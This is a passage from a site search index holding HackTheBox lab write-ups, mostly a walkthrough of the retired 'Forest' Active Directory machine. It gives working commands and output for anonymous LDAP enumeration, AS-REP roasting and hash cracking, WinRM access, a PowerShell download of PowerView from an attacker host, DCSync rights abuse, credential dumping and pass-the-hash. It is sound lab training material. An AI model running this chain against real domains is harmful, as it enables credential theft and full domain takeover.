valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-03-19T04:44:16\n|_  start_date: N/A\n|_clock-skew: 6h59m59s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 97.03 seconds\n</code></pre> After enumerating for quite some time, I was able to use <code>Netexec</code> with the <code>Guest</code> logon to enumerate the shares of the host machine.</p> <p>```zsh</p>"},{"location":"htb/labs/easy/forest-retire/","title":"Forest retire","text":"<p>This is a writeup for the HTB machine Forest (Retire).</p>"},{"location":"htb/labs/easy/forest-retire/#forest","title":"Forest","text":"<ul> <li>IP Address: <code>10.10.11.35</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> <li>Tags: <code>Active Directory</code>, <code>Windows</code>, <code>LDAP</code>, <code>Bloodhound</code>, <code>Psexec</code>, <code>PowerView</code>, <code>SecretDump</code></li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/forest-retire/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sCV 10.10.10.161                                                                       at \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 18:56 EDT\nNmap scan report for 10.10.10.161\nHost is up (0.10s latency).\nNot shown: 989 closed tcp ports (conn-refused)\nPORT     STATE SERVICE      VERSION\n53/tcp   open  domain       Simple DNS Plus\n88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-17 23:04:45Z)\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2025-03-17T16:04:55-07:00\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: mean: 2h27m52s, deviation: 4h02m31s, median: 7m51s\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-time:\n|   date: 2025-03-17T23:04:52\n|_  start_date: 2025-03-17T23:02:24\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 41.12 seconds\n</code></pre> <p>Using <code>ldapsearch</code> I was able to enumerate the ldap server anonymously <pre><code>ldapsearch -x -s sub -b \"dc=htb,dc=local\" -H ldap://10.10.10.161 \"(objectClass=*)\" \"*\" +\n</code></pre></p> <p>Using windapsearch I found 28 users using the <code>-U</code> flag for users <pre><code>\uf306 \uf07c  ~/To/windapsearch on \uf113  \uf126 master \u276f ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U        took \uf252  19s at \uf017  10:56:49 PM\n[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 10.10.10.161\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=htb,DC=local\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      None\n\n[+] Enumerating all AD users\n[+]     Found 28 users:\n\ncn: Guest\n\ncn: DefaultAccount\n\ncn: Exchange Online-ApplicationAccount\nuserPrincipalName: Exchange_Online-ApplicationAccount@htb.local\n\ncn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}\nuserPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local\n\ncn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}\nuserPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local\n\ncn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}\nuserPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local\n\ncn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}\nuserPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local\n\ncn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136\nuserPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local\n\ncn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042\nuserPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local\n\ncn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}\nuserPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local\n\ncn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}\nuserPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local\n\ncn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\nuserPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local\n\ncn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe\nuserPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local\n\ncn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50\nuserPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local\n\ncn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5\nuserPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local\n\ncn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8\nuserPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local\n\ncn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba\nuserPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local\n\ncn: HealthMailbox6ded67848a234577a1756e072081d01f\nuserPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local\n\ncn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab\nuserPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local\n\ncn: HealthMailboxfd87238e536e49e08738480d300e3772\nuserPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local\n\ncn: HealthMailboxb01ac647a64648d2a5fa21df27058a24\nuserPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local\n\ncn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf\nuserPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local\n\ncn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e\nuserPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local\n\ncn: Sebastien Caron\nuserPrincipalName: sebastien@htb.local\n\ncn: Lucinda Berger\nuserPrincipalName: lucinda@htb.local\n\ncn: Andy Hislip\nuserPrincipalName: andy@htb.local\n\ncn: Mark Brandt\nuserPrincipalName: mark@htb.local\n\ncn: Santi Rodriguez\nuserPrincipalName: santi@htb.local\n\n\n[*] Bye!\n</code></pre></p> <p>Checking for <code>serviceaccounts</code> I found a service acount using the ``--custom \"objectClass=* \"</p> <pre><code>\uf306 \uf07c  ~/Tools/windapsearch on \uf113  \uf126 master \u276f ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom \"objectClass=*\"\n[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 10.10.10.161\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=htb,DC=local\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      None\n[+] Performing custom lookup with filter: \"objectClass=*\"\n[+]     Found 312 results:\n\nDC=htb,DC=local\n\nCN=Users,DC=htb,DC=local\n\n&lt;&lt;SNIP&gt;&gt;\n\nOU=Service Accounts,DC=htb,DC=local\n\nCN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local\n\nOU=Security Groups,DC=htb,DC=local\n</code></pre>"},{"location":"htb/labs/easy/forest-retire/#foothold","title":"Foothold","text":"<p><code>GetNPUsers.py</code> from the Impacket suite is used to exploit users with the \"Do not require Kerberos pre-authentication\" setting enabled. This allows you to request Kerberos TGTs without providing the user's password, and then crack the resulting hash offline. Here's a breakdown of how to use it:  </p> <p>Understanding the Process</p> <p>AS-REP Roasting: - The core technique is known as AS-REP roasting.  - When a user has \"Do not require Kerberos pre-authentication\" set, the Kerberos Key Distribution Center (KDC) will issue a TGT without requiring pre-authentication. - This TGT contains a hash of the user's password, which can be extracted and cracked.  </p> <p>GetNPUsers.py:</p> <ul> <li>This Impacket script automates the process of requesting these TGTs and extracting the hashes.</li> </ul> <pre><code>\uf306 \uf015  ~ \u276f impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass                      took \uf252  13s at \uf017  11:15:15 PM\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d83e190f6f4c0e18b9119825b780eee$1c7372e2d3e52457028f1b143d51a115d9face7d6250c144774087196e5bf8a67ddb28af68aaffcb2a3d21b8ef1b9c7acfeddf159a4be34d38e14ac468c391570576873f92b55ae089f4a877090f98506b432d17eedf70481deefec66d269c7fe5518d4a0d3c8d582487d27df660bd577f08cd856c4d7870a5efa488fce91bbe4099dce4cfc1919271dc151dc7e28f558c6b6c8696121989825c07d89ee30ebcc6136564e3b3932fa3a18e3df9571d9a83dc1a0cc1673ced70889cfbb00acc8dab8fd9d2f84e58a7326c9e38ad79499078c1e3f2f70ba4112b97be77594a5d08c9ca333bdad6\n</code></pre>"},{"location":"htb/labs/easy/forest-retire/#cracking-the-hash","title":"Cracking the Hash","text":"<p>The hash obtained from the previous step can be cracked using a tool like Hashcat or John the Ripper. Here's how to do it with John the Ripper: <pre><code> ~ \u276f john john.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt                                       took \uf252  6s at \uf017  11:27:25 PM\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nNode numbers 1-4 of 4 (fork)\nPress 'q' or Ctrl-C to abort, almost any other key for status\ns3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)\n4 1g 0:00:00:03 DONE (2025-03-17 23:27) 0.2958g/s 302196p/s 302196c/s 302196C/s s3urkf2m..s3rvice\n3 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 329893p/s 329893c/s 329893C/sa6_123\n1 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 328985p/s 328985c/s 328985C/s    qaz.ie168\nWaiting for 3 children to terminate\n2 0g 0:00:00:10 DONE (2025-03-17 23:27) 0g/s 328683p/s 328683c/s 328683C/s   tania.abygurl69\nSession completed.\n</code></pre> The cracked password is <code>s3rvice</code>.</p> <p>Using <code>Netexec</code> I was able to discover that the credentials can be able to use <code>winrm</code> to gain an interactive shell. <pre><code>netexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice                                             took \uf252  4s at \uf017  12:26:29 PM\nWINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)\nWINRM       10.10.10.161    5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)\n</code></pre></p>"},{"location":"htb/labs/easy/forest-retire/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using BlooodHound, BloodHound itself is primarily a graphical tool, but the data it uses is collected through command-line tools. Here's a breakdown of the process:</p> <p>BloodHound relies on data collectors (ingestors) to gather information from Active Directory. The most common ingestor is SharpHound. <pre><code>~/Tools/BloodHound.py on \uf113  \uf126 master \u276f ./bloodhound.py -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.1\n0.10.161\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: htb.local\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known\nINFO: Connecting to LDAP server: FOREST.htb.local\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: FOREST.htb.local\nINFO: Found 32 users\nINFO: Found 76 groups\nINFO: Found 2 gpos\nINFO: Found 15 ous\nINFO: Found 20 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: EXCH01.htb.local\nINFO: Querying computer: FOREST.htb.local\nINFO: Done in 00M 31S\n</code></pre></p> <p>The data collected by SharpHound is then imported into the BloodHound GUI for analysis. You can use various queries to identify potential privilege escalation paths, such as finding users with high privileges, identifying misconfigurations, or discovering sensitive group memberships.</p> <p>Import all the <code>.json</code> file to Bloodhound Go to the <code>Analysis</code> Tab and click <code>Shortest Paths to High Value Targets</code></p> <p></p> <p>We can see that the <code>EXCHANGE WINDOWS PERMISSIONS</code> Group has <code>WriteDacl</code> to the htb.local</p> <p>According to <code>Microsoft documentation</code>, the Active Directory group that grants limited account creation privileges, including the ability to create and modify most types of accounts, is:</p>"},{"location":"htb/labs/easy/forest-retire/#account-operators","title":"Account Operators","text":"<p>Here's a breakdown:</p> <ul> <li> <p>The Account Operators group allows its members to create and modify user accounts, local groups, and global groups.   </p> </li> <li> <p>However, it's important to note that this group has limitations. It cannot manage certain highly privileged accounts and groups, such as the Administrator account or the Domain Admins group.  </p> </li> </ul> <p>Therefore, while the Domain Admins group has full control over all aspects of Active Directory, the Account Operators group is the one specifically designated for the task of creating and modifying most standard accounts.</p>"},{"location":"htb/labs/easy/forest-retire/#dcsync","title":"DCSync","text":"<p>A user with WriteDACL permissions on the domain root has a very powerful privilege, essentially granting them the ability to take full control of the entire Active Directory domain. Here's a breakdown of the attacks you can perform:</p>"},{"location":"htb/labs/easy/forest-retire/#understanding-writedacl","title":"Understanding WriteDACL","text":"<ul> <li> <p>WriteDACL allows a user to modify the Discretionary Access Control List (DACL) of an object. The DACL defines who has what permissions on the object.</p> </li> <li> <p>On the domain root, this means you can change the permissions of any object in the domain, including highly privileged groups.</p> </li> </ul>"},{"location":"htb/labs/easy/forest-retire/#attack-vectors","title":"Attack Vectors","text":"<ul> <li>Adding Yourself to Domain Admins:</li> <li>The most direct and devastating attack.</li> <li>You can modify the DACL of the Domain Admins group to add your own user account.   </li> </ul> <p>This grants you full administrative control over the domain.   </p> <p></p> <p>The above commands created a new user <code>Bob</code> and added it to the <code>Exchange Windows Permissions</code> groups</p> <p>Imported the <code>PowerView</code> module <pre><code>powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/PowerView.ps1', 'C:\\Users\\svc-alfresco\\Documents\\PowerView.ps1')\"\n</code></pre></p> <p>After inporting <code>PowerView.ps1</code> Run the below commands to add the New users Object and Password and get him <code>DCSync</code> right</p> <p><pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $pass = convertto-securestring 'Password123' -asplain -force\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $cred = new-object system.management.automation.pscredential('htb\\Bob', $pass)\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-ObjectACL -PrincipalIdentity Bob -Credential $cred -Rights DCSync\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt;\n</code></pre> Now we can now run <code>SecretDump</code> to dump all the Domain Credentials</p> <p></p> <p>Lets crack the <code>Administrator</code> password hash <pre><code>htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n</code></pre> **Understanding the Hash Format</p> <ul> <li><code>htb.local\\Administrator:</code> This is the username and domain.</li> <li><code>500:</code> This is the user ID (RID).</li> <li><code>aad3b435b51404eeaad3b435b51404ee:</code> This is the LM hash (which is usually useless nowadays).</li> <li><code>32693b11e6aa90eb43d32c72a07ceea6:</code> This is the NTLM hash, which is what we need to crack.</li> </ul> <p>Another Option is to run <code>impacket-psexec</code> and use the hash of the administrator and get an interactive shell</p> <p></p> <p>Now we have full control of the machine, we can read the user.txt and root.txt file</p> <p><code>Happy Hacking!</code></p>"}]}